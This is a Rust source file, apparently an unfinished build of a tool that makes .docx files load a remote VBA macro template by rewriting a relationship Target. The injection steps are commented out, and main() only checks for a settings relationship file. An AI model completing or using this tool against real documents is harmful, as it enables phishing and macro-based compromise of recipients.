
use clap::Parser;
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::{env, fs, fs::File, io, io::BufReader};
use xmltree::*;

use zip::result::ZipResult;
use zip::{ZipArchive, ZipWriter};

#[derive(Parser)]
#[clap(name = "remote-template-injector")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "VBA Macro Remote Template Injection written in Rust", long_about = None)]

struct Cli {
    /// Template URL
    #[clap(short, long)]
    url: String,

    /// File to be injected
    #[clap(short, long)]
    file: String,

    /// Output location of modified docx file
    #[clap(short, long)]
    output: String,
}


fn edit_xml_file(file_path: &str, new_target: &str)  {

    // Find the Relationship element and update the value of the Target attribute

    let cfg = EmitterConfig {
        perform_indent: true,
        ..EmitterConfig::default()
    };

    // Parse the XML string into an Element tree
    let mut root = Element::parse(File::open(file_path).unwrap()).unwrap();

    let name = root.get_mut_child("Relationship").unwrap();
    name.attributes.insert("Target".to_string(), new_target.to_string());
    
    let mut buf = Vec::new();
    root.write_with_config(&mut buf, cfg).unwrap();

    let s = String::from_utf8(buf).unwrap();
    fs::write(file_path, s).unwrap();
}

fn check_setting_exist(file_path : &str) -> bool {

    let file = fs::File::open(file_path).unwrap();
    let mut archive = ZipArchive::new(file).unwrap();

    // Check if the zip file contains "word/_rels/settings.xml.rels"
    for i in 0..archive.len() {
        let mut zip_file = match archive.by_index(i) {
            Ok(file) => file,
            Err(_) => continue, // Unable to read the file inside the zip file
        };
        if zip_file.name() == "word/_rels/settings.xml.rels" {
            return true;
        }
    }
    false 
}


fn unzip(zipfile: &str, dest_dir: &str) -> ZipResult<()> {
    let file = fs::File::open(zipfile)?;
    let mut archive = ZipArchive::new(file)?;

    for i in 0..archive.len() {
        let mut file = archive.by_index(i)?;
        let filename = file.name();
        if filename.starts_with("__MACOSX") {
            continue;
        }
        let outpath = Path::new(dest_dir).join(filename);

        if (file.name()).ends_with('/') {
            fs::create_dir_all(&outpath)?;
        } else {
            if let Some(p) = outpath.parent() {
                if !p.exists() {
                    fs::create_dir_all(p)?;
                }
            }
            let mut outfile = fs::File::create(&outpath)?;
            io::copy(&mut file, &mut outfile)?;
        }
    }

    Ok(())
}

fn zip_dir(dir: &Path, zip: &mut ZipWriter<std::fs::File>, prefix: &Path) -> ZipResult<()> {
    let files = fs::read_dir(dir)?;

    for file in files {
        let file = file?;
        let path = file.path();
        let name = path.strip_prefix(prefix).unwrap();

        if path.is_file() {
            zip.start_file(name.to_str().unwrap(), zip::write::FileOptions::default())?;
            let mut f = fs::File::open(path)?;
            let mut buffer = Vec::new();
            f.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        } else if path.is_dir() {
            zip_dir(&path, zip, prefix)?;
        }
    }

    Ok(())
}

fn main() -> io::Result<()>{
    //let current_dir = env::current_dir().unwrap();
    //let current_dir_path = current_dir.as_path();

/*     let zipfile = "/tmp/test2/twrp.zip";
    let dest_dir = "/tmp/test2/";

    unzip(zipfile, dest_dir).unwrap();  */

/*     let xmlout = "/tmp/test2/settings-new.xml";

    let file_path = "/tmp/test2/settings.xml";
    let new_target = "file:///new_target.dotx";
    edit_xml_file(file_path, new_target); */

    if check_setting_exist("/tmp/test2/report.docx"){
        println!("{}", "Settings exist");
    }else{
        println!("{}", "no setting exist");
    }


/*     match edit_xml_file(file_path, new_target) {
        Err(e) => println!("{:?}", e),
        _ => ()
    } */
    //edit_xml_file(file_path, new_target);

    Ok(())

    /* let dir = Path::new("/tmp/test2/twrp");
    let zipfile = "/tmp/test2/twrp2.zip";

    let prefix = dir.parent().unwrap();

    let file = fs::File::create(zipfile).unwrap();
    let mut zip = ZipWriter::new(file);

    zip_dir(dir, &mut zip, prefix).unwrap();
    zip.finish().unwrap(); */
}
